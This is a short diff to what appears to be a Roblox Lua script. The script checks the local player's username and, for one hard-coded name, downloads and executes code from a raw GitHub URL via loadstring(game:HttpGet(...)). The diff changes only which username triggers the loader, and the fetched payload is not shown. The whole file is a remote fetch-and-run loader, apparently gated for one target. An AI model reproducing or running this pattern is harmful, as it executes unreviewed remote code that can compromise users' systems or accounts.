@@ -1,5 +1,5 @@
 local playerName = game.Players.LocalPlayer.Name
 
-if playerName == "Znactr" then
+if playerName == "31arcun3156" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/qwdawsdgrwaW/31arcun3156/main/s/script"))()
 end
